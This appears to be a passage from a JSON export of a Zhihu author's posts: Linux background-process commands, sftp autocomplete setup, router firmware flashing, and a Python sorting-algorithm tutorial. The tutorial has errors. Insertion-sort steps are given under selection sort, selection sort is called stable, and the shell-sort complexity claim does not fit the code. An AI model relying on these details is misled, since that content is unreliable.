<b>中查询到已经后台运行的程序</b></p><h2>杀死后台运行程序</h2><ol><li>方法一</li></ol><p>启动时输出后台运行程序的进程号，然后读取进程号杀死后台程序：</p><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"nb\">kill</span> -9 <span class=\"sb\">`</span>cat pidfile.txt<span class=\"sb\">`</span></code></pre></div><ol><li>方法二</li></ol><p>根据程序名杀死后台进程：</p><div class=\"highlight\"><pre><code class=\"language-bash\">ps -ef <span class=\"p\">|</span> grep <span class=\"s1\">&#39;python main.py&#39;</span> <span class=\"p\">|</span> grep -v grep <span class=\"p\">|</span> awk <span class=\"s1\">&#39;{print $2}&#39;</span> <span class=\"p\">|</span>xargs <span class=\"nb\">kill</span> -9</code></pre></div><h2>其他相关命令</h2><ul><li><b>Ctrl + z</b><br/>可以将一个<b>正在前台执行</b>的命令放到<b>后台</b>，并且处于<b>暂停</b>状态。</li><li><b>bg</b><br/>将一个在<b>后台暂停</b>的命令，变成在<b>后台继续执行</b>。如果后台中有多个命令，可以用 <code>bg %jobnumber</code>将选中的命令调出。</li><li><b>fg</b><br/>将<b>后台</b>中的命令调至<b>前台继续运行</b>。如果后台中有多个命令，可以用 <code>fg %jobnumber</code>（是命令编号，不是进程号）将选中的命令调出。</li></ul>", 
            "topic": [
                {
                    "tag": "Linux", 
                    "tagLink": "https://api.zhihu.com/topics/19554300"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/72050485", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "让 sftp 支持自动补全", 
            "content": "<h2>前言</h2><p>用惯了自动补全，进入 sftp 后无法使用自动补全非常不方便，记录一下改造过程。</p><h2>方法</h2><ol><li>首先安装 <code>with-readline</code></li><li>然后在 <code>zsh</code> 或者 <code>bash</code> 配置文件中添加：</li></ol><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"c1\"># 打开配置文件</span>\nvim .zshrc <span class=\"c1\"># zsh 配置文件</span>\n<span class=\"c1\"># vim .bash_profile  # bash 配置文件</span>\n\n<span class=\"c1\"># 添加下列内容</span>\n<span class=\"nb\">alias</span> <span class=\"nv\">sftp</span><span class=\"o\">=</span><span class=\"s1\">&#39;with-readline sftp&#39;</span></code></pre></div><ol><li>使配置生效</li></ol><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"nb\">source</span> ~/.zshrc\n<span class=\"c1\"># source ~/.bash_profile</span> </code></pre></div><h2>参考</h2><a href=\"https://link.zhihu.com/?target=https%3A//github.com/ewxrjk/with-readline\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-27ab1b5db66e3b1e3154092eb8dc5763_ipico.jpg\" data-image-width=\"100\" data-image-height=\"100\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ewxrjk/with-readline</a><p></p>", 
            "topic": [
                {
                    "tag": "sftp", 
                    "tagLink": "https://api.zhihu.com/topics/20053222"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/71277999", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "Newifi mini 刷 breed 不死和老毛子 Padavan 固件", 
            "content": "<h2>前言</h2><p>闲鱼 50 元包邮入手了一个 Newifi mini 路由器，因为没有 Windows 电脑一直没有刷老毛子系统，记录一下刷机过程。</p><h2>步骤</h2><p>首先要根据路由器型号选择相应的 Breed 版本和路由器系统版本。 Newifi mini 对应的版本如下：</p><ul><li>Breed：<a href=\"https://link.zhihu.com/?target=https%3A//breed.hackpascal.net/breed-mt7620-lenovo-y1.bin\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">breed-mt7620-lenovo-y1.bin</a></li><li>Padavan 固件：<a href=\"https://link.zhihu.com/?target=http%3A//opt.cn2qq.com/padavan/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RT-AC54U-GPIO-11-newifimini-128M_xxxxx.trx</a></li></ul><h2>刷入 Breed</h2><ol><li>路由器插上电源，用网线将路由器和电脑连接在一起（Newifi 的任意一个网口均可）；</li><li>在「网络和共享中心」（Windows）或者「系统偏好设置 👉🏻 网络」（Mac），找到对应的网络，设置其 IPv4 地址为 192.168.1.2，子网掩码为 255.255.255.0；</li><li>设置好后，断开路由器电源，按住 Reset 按键不松，连上电源，Reset 继续按住 5 秒以上。如果看到路由器的部分或全部LED连闪4次，或 ping 通即表明进入 Web 刷机模式；</li><li>这时候电脑访问 192.168.1.1 即可进入路由器自带恢复模式；</li><li>选择文件 <code><b>breed-mt7620-lenovo-y1.bin</b></code>，点击恢复按钮；</li><li>等待升级完成</li></ol><h2>刷入 Padavan 固件</h2><p>在刷好 Breed 之后，我们用 刷 Breed 步骤中的 1~4 步，进入 Breed 进行固件的升级：</p><ol><li>进入 Breed 之后，选择左侧侧的「固件更新」；</li><li>将右侧「固件」旁的选择框打勾，并选择上面下载好的 <code><b>RT-AC54U-GPIO-11-newifimini-128M_xxxxx.trx</b></code> 文件，将「自动重启」打勾，点击「上传」按钮</li><li>确认更新；</li><li>等待完成即可。</li></ol><p>默认配置</p><ul><li>旧固件网关：192.168.1.1</li><li>新固件网关：192.168.123.1</li><li>管理页面：192.168.123.1</li><li>管理账号：admin/admin</li><li>wifi:1234567890</li></ul><p>将之前手动设置的网络 IP，用同样的方式改为自动获取。访问 <code><b>192.168.123.1</b></code> 进入管理页面，账号密码 <code>admin</code>。</p><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//www.right.com.cn/forum/thread-161906-1-1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">AR/QCA/MTK Breed，功能强大的多线程 Bootloader</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.right.com.cn/forum/thread-161324-1-1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">改华硕[N14U N54U]5G 2G的7620老毛子Padavan固件(私人云储存 aria2 QOS)</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//blog.lbinin.com/interest/Newifi-Padavan.html%23%25E8%2583%258C%25E6%2599%25AF\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Newifi Mini 刷机教程</a></li></ol>", 
            "topic": [
                {
                    "tag": "OpenWrt", 
                    "tagLink": "https://api.zhihu.com/topics/19653984"
                }
            ], 
            "comments": [
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>为什么要刷机？原路由器有什么缺陷吗？</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "刷了可玩性更高，可以实现路由器级别翻墙，去广告等等一堆东西", 
                            "likes": 1, 
                            "replyToAuthor": "知乎用户"
                        }, 
                        {
                            "userName": "何嘉骁狽", 
                            "userLink": "https://www.zhihu.com/people/3440cc73e0e0a4ad7a8b43167f10e9ab", 
                            "content": "刷了有没有app可以外网连接？以前的新路由app不能使用了。[捂脸]", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/49271189", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 659, 
            "title": "常见排序算法 Python 实现及舞蹈展示", 
            "content": "<h2><b>前言</b></h2><p>整理了一下常见排序算法 Python 的实现和动图及舞蹈视频对算法运行过程的可视化展示。</p><hr/><h2><b>冒泡排序</b></h2><h2>工作原理</h2><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ol><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(N^2)</li><li><b>最优时间复杂度    </b>O(N)</li><li><b>平均时间复杂度    </b>O(N^2)</li><li><b>额外空间复杂度    </b>O(1)</li><li><b>稳定性</b>    稳定</li></ul><h2>实现</h2><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">bubble_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"c1\"># 首先得到每个循环需要比较的次数，第一次从0位置开始需要比较 len(alist) - 1 次</span>\n    <span class=\"k\">for</span> <span class=\"n\">passnum</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">):</span>\n        <span class=\"c1\"># 相邻两个位置不断比较，如果左边的数大于右边就交换位置</span>\n        <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">passnum</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">]:</span>\n                <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">],</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">],</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span></code></pre></div><h2>可视化</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e164c2436ed5486ed13e54135a1d009a_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic3.zhimg.com/v2-e164c2436ed5486ed13e54135a1d009a_b.jpg\" class=\"content_image\" width=\"280\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;280&#39; height=&#39;237&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic3.zhimg.com/v2-e164c2436ed5486ed13e54135a1d009a_b.jpg\" class=\"content_image lazy\" width=\"280\" data-actualsrc=\"https://pic3.zhimg.com/v2-e164c2436ed5486ed13e54135a1d009a_b.gif\"/></figure><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044983152615350272\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之冒泡排序\" data-poster=\"https://pic2.zhimg.com/v2-04bbb0d744f3a66ef23485c6fb70c975.jpg\" data-lens-id=\"1044983152615350272\"><img class=\"thumbnail\" src=\"https://pic2.zhimg.com/v2-04bbb0d744f3a66ef23485c6fb70c975.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之冒泡排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044983152615350272</span></span></a><h2><b>选择排序</b></h2><h2>工作原理</h2><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。步骤如下：</p><ol><li>从第一个元素开始，该元素可以认为已经被排序；</li><li>取出下一个元素，在已经排序的元素序列中从后向前扫描;</li><li>如果该元素（已排序）大于新元素，将该元素移到下一位置;</li><li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置;</li><li>将新元素插入到该位置后;</li><li>重复步骤2~5。</li></ol><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(N^2)</li><li><b>最优时间复杂度    </b>O(N^2)</li><li><b>平均时间复杂度    </b>O(N^2)</li><li><b>额外空间复杂度    </b>O(1)</li><li><b>稳定性</b>    稳定</li></ul><h2>实现</h2><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">select_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">):</span>\n        <span class=\"n\">min_index</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n        <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)):</span>\n            <span class=\"k\">if</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span> <span class=\"o\">&lt;</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">min_index</span><span class=\"p\">]:</span>\n                <span class=\"n\">min_index</span> <span class=\"o\">=</span> <span class=\"n\">j</span>\n\n        <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">],</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">min_index</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">min_index</span><span class=\"p\">],</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span></code></pre></div><h2>可视化</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-2bdd6b162c403d376c56c02e8a5560af_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"288\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-2bdd6b162c403d376c56c02e8a5560af_b.jpg\" class=\"content_image\" width=\"288\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;288&#39; height=&#39;288&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"288\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-2bdd6b162c403d376c56c02e8a5560af_b.jpg\" class=\"content_image lazy\" width=\"288\" data-actualsrc=\"https://pic4.zhimg.com/v2-2bdd6b162c403d376c56c02e8a5560af_b.gif\"/></figure><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044983415774425088\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之选择排序\" data-poster=\"https://pic2.zhimg.com/v2-9288314a5fb8ce3db6cf1c853c7bb625.jpg\" data-lens-id=\"1044983415774425088\"><img class=\"thumbnail\" src=\"https://pic2.zhimg.com/v2-9288314a5fb8ce3db6cf1c853c7bb625.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之选择排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044983415774425088</span></span></a><h2><b>插入排序</b></h2><h2>工作原理</h2><p>通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(N^2)</li><li><b>最优时间复杂度    </b>O(N)</li><li><b>平均时间复杂度    </b>O(N^2)</li><li><b>额外空间复杂度    </b>O(1)</li><li><b>稳定性</b>    稳定</li></ul><h2>实现</h2><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">insertion_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"c1\"># 从索引为 1 的值开始从后向前扫描</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)):</span>\n        <span class=\"n\">current_value</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n        <span class=\"n\">position</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n        <span class=\"c1\"># 如果前一个数大于当前值则将前一个数向右移动一位，直到找到前一个数小于当前值得位置，将该位置的值设为当前值</span>\n        <span class=\"k\">while</span> <span class=\"n\">position</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"ow\">and</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">current_value</span><span class=\"p\">:</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">]</span>\n            <span class=\"n\">position</span> <span class=\"o\">-=</span> <span class=\"mi\">1</span>\n\n        <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">current_value</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span></code></pre></div><h2>可视化</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-9ce56fa906ecc71adb5110c7fc9797a0_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic1.zhimg.com/v2-9ce56fa906ecc71adb5110c7fc9797a0_b.jpg\" class=\"content_image\" width=\"280\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;280&#39; height=&#39;237&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"237\" data-thumbnail=\"https://pic1.zhimg.com/v2-9ce56fa906ecc71adb5110c7fc9797a0_b.jpg\" class=\"content_image lazy\" width=\"280\" data-actualsrc=\"https://pic1.zhimg.com/v2-9ce56fa906ecc71adb5110c7fc9797a0_b.gif\"/></figure><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044983594745376768\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之插入排序\" data-poster=\"https://pic2.zhimg.com/v2-81f427f0753e366d5857481daabd5825.jpg\" data-lens-id=\"1044983594745376768\"><img class=\"thumbnail\" src=\"https://pic2.zhimg.com/v2-81f427f0753e366d5857481daabd5825.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之插入排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044983594745376768</span></span></a><h2><b>希尔排序</b></h2><h2>工作原理</h2><p>希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。希尔排序是非稳定排序算法。</p><p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p><ol><li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li><li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位。</li></ol><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(Nlog^2N)</li><li><b>最优时间复杂度    </b>O(N)</li><li><b>平均时间复杂度    </b>-</li><li><b>额外空间复杂度    </b>O(1)</li><li><b>稳定性</b>    不稳定</li></ul><h2>实现</h2><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">shell_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"n\">sub_list_count</span> <span class=\"o\">=</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span> <span class=\"o\">//</span> <span class=\"mi\">2</span>\n    <span class=\"k\">while</span> <span class=\"n\">sub_list_count</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">:</span>\n        <span class=\"k\">for</span> <span class=\"n\">start_position</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">sub_list_count</span><span class=\"p\">):</span>\n           <span class=\"n\">alist</span> <span class=\"o\">=</span> <span class=\"n\">gap_insertion_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">start_position</span><span class=\"p\">,</span> <span class=\"n\">sub_list_count</span><span class=\"p\">)</span>\n\n        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s1\">&#39;After increments of size&#39;</span><span class=\"p\">,</span> <span class=\"n\">sub_list_count</span><span class=\"p\">,</span> <span class=\"s1\">&#39;The list is&#39;</span><span class=\"p\">,</span> <span class=\"n\">alist</span><span class=\"p\">)</span>\n        <span class=\"n\">sub_list_count</span> <span class=\"o\">=</span> <span class=\"n\">sub_list_count</span> <span class=\"o\">//</span> <span class=\"mi\">2</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">gap_insertion_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">start</span><span class=\"p\">,</span> <span class=\"n\">gap</span><span class=\"p\">):</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">start</span> <span class=\"o\">+</span> <span class=\"n\">gap</span><span class=\"p\">,</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">),</span> <span class=\"n\">gap</span><span class=\"p\">):</span>\n        <span class=\"n\">current_value</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>\n        <span class=\"n\">position</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n\n        <span class=\"k\">while</span> <span class=\"n\">position</span> <span class=\"o\">&gt;=</span> <span class=\"n\">gap</span> <span class=\"ow\">and</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span> <span class=\"o\">-</span> <span class=\"n\">gap</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">current_value</span><span class=\"p\">:</span>\n            <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span> <span class=\"o\">-</span> <span class=\"n\">gap</span><span class=\"p\">]</span>\n            <span class=\"n\">position</span> <span class=\"o\">=</span> <span class=\"n\">position</span> <span class=\"o\">-</span> <span class=\"n\">gap</span>\n\n        <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">position</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">current_value</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span></code></pre></div><h2>可视化</h2><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-f9616f6892819e579a2d4ab10256a732_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"277\" data-rawheight=\"344\" data-thumbnail=\"https://pic3.zhimg.com/v2-f9616f6892819e579a2d4ab10256a732_b.jpg\" class=\"content_image\" width=\"277\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;277&#39; height=&#39;344&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"277\" data-rawheight=\"344\" data-thumbnail=\"https://pic3.zhimg.com/v2-f9616f6892819e579a2d4ab10256a732_b.jpg\" class=\"content_image lazy\" width=\"277\" data-actualsrc=\"https://pic3.zhimg.com/v2-f9616f6892819e579a2d4ab10256a732_b.gif\"/></figure><a class=\"video-box\" href=\"https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1044983736907051008\" target=\"_blank\" data-video-id=\"\" data-video-playable=\"true\" data-name=\"舞动的排序算法之希尔排序\" data-poster=\"https://pic4.zhimg.com/v2-eeba155aa454cc07777b28e8fddc238b.jpg\" data-lens-id=\"1044983736907051008\"><img class=\"thumbnail\" src=\"https://pic4.zhimg.com/v2-eeba155aa454cc07777b28e8fddc238b.jpg\"/><span class=\"content\"><span class=\"title\">舞动的排序算法之希尔排序<span class=\"z-ico-extern-gray\"></span><span class=\"z-ico-extern-blue\"></span></span><span class=\"url\"><span class=\"z-ico-video\"></span>https://www.zhihu.com/video/1044983736907051008</span></span></a><h2>快速排序</h2><h2>工作原理</h2><p>快速排序使用分治法（Divide and conquer）策略来把一个序列（list）分为两个子序列（sub-lists）。步骤如下：</p><ol><li>从数列中挑出一个元素，称为“基准”（pivot）；</li><li>重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（相同的数可以到任何一边）。在这个分割结束之后，该基准就处于数列的中间位置。这个称为分割（partition）操作；</li><li>递归地（recursively）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li></ol><p>递归到最底部时，数列的大小是零或一，也就是已经排序好了。这个算法一定会结束，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p><h2>复杂度</h2><ul><li><b>最坏时间复杂度    </b>O(N^2)</li><li><b>最优时间复杂度    </b>O(NlogN)</li><li><b>平均时间复杂度    </b>O(NlogN)</li><li><b>额外空间复杂度    </b>O(logN)</li><li><b>稳定性</b>    不稳定</li></ul><h2>实现</h2><p>快速排序首先选择一个值，该值称为 枢轴值。虽然有很多不同的方法来选择枢轴值，我们将使用列表中的第一项。</p><div class=\"highlight\"><pre><code class=\"language-python\"><span class=\"k\">def</span> <span class=\"nf\">quick_sort</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">):</span>\n    <span class=\"n\">quick_sort_helper</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">quick_sort_helper</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"n\">last</span><span class=\"p\">):</span>\n    <span class=\"k\">if</span> <span class=\"n\">first</span> <span class=\"o\">&lt;</span> <span class=\"n\">last</span><span class=\"p\">:</span>\n        <span class=\"n\">splitpoint</span> <span class=\"o\">=</span> <span class=\"n\">partition</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"n\">last</span><span class=\"p\">)</span>\n        <span class=\"n\">alist</span> <span class=\"o\">=</span> <span class=\"n\">quick_sort_helper</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"n\">splitpoint</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n        <span class=\"n\">alist</span> <span class=\"o\">=</span> <span class=\"n\">quick_sort_helper</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">splitpoint</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"n\">last</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">alist</span>\n\n\n<span class=\"k\">def</span> <span class=\"nf\">partition</span><span class=\"p\">(</span><span class=\"n\">alist</span><span class=\"p\">,</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"n\">last</span><span class=\"p\">):</span>\n    <span class=\"n\">pivotvalue</span> <span class=\"o\">=</span> <span class=\"n\">alist</span><span class=\"p\">[</span><span class=\"n\">first</span><span class=\"p\">]</span>\n\n    <span class=\"n\">leftmark</span> <span class=\"o\">=</span> <span 